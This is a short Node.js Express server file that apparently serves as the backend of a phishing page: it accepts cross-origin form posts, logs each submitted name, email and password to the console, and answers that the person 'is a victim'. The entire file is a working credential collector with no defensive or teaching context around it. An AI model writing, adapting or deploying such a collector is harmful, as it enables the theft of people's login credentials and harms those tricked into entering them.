const express = require('express');
const cors = require("cors");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.post("/", (req, res) => {
    const data = req.body;

    console.log("Name: ", data.name);
    console.log("Username: ", data.email);
    console.log("Access: ", data.pass);
    res.send(`Success: ${data.name} - ${data.email} is a victim!`);
});

app.listen(PORT, () => {
  console.log(`Express server running at http://localhost:${PORT}/`);
});